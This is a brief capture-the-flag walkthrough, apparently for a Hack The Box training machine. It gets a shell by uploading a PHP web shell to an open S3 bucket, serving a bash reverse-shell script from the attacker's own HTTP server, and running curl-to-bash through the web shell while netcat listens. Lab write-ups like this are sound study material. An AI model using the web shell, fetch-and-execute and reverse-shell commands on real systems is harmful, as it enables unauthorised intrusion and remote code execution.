This server is configured to run files written in what web scripting language?
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb -> php

To get the flag:
To get a shell in php we need <?php system($_GET['cmd']);?> -> echo '<?php system($_GET['cmd']);?>' > shell.php
Now to upload: aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
We can execute code now but we still need a shell. Google bash reverse shell to get shell.sh script
Start listening to the port you just opened: nc -lvp 1337
Now to connect the two set up a webserver for the remote site to connect to: python3 -m http.server 8000
To connect: http://thetoppers.htb/shell.php?cmd=curl%2010.10.15.158:8000/shell.sh|bash
Now search for flag.txt: find / -type f -name flag.txt -> /var/www/flag.txt
